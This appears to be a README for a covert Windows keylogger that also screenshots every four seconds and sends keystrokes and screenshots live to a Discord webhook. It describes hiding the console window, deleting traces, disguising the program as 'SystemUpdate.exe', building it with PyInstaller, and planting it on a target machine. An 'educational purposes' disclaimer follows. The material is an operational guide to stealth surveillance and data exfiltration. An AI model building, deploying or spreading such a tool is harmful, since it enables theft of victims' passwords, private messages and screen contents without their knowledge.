C2 Keylogger + Screenshot Tool (Discord Webhook Version)
This tool silently records keystrokes and takes screenshots every 4 seconds, then sends everything live to your Discord channel using a webhook.
No local log file or screenshot folder is left behind on the target machine.
FEATURES

Completely hidden (no console window)
Sends every keystroke to your Discord in real time
Takes a full screen screenshot every 4 seconds and sends it instantly
Everything is deleted after sending (zero footprint)
Simple double-click toggle: start and stop with the same .exe
Works on any Windows machine (including VMs)

HOW TO USE

Place SystemUpdate.exe on the target machine (VM or anywhere)
Double-click SystemUpdate.exe once → it starts silently
All keystrokes and screenshots will now appear live in your Discord channel
To stop it → double-click the exact same SystemUpdate.exe again

That’s it. No terminal, no extra steps.
FILES CREATED (on the machine where it runs)

kl.lock          → small temporary toggle file (auto deleted when stopped)
Temporary screenshot files are created and deleted immediately after sending

REQUIREMENTS TO BUILD

pip install pynput mss pillow requests

To rebuild the exe:

python -m PyInstaller --onefile --noconsole --name "SystemUpdate" keylog_c2.py

IMPORTANT NOTE

This tool is for educational purposes and personal learning only
Change the WEBHOOK_URL in the code if you want to use a different Discord channel
Currently starts in ACTIVE mode (sends data immediately)
Double-click the exe again to stop cleanly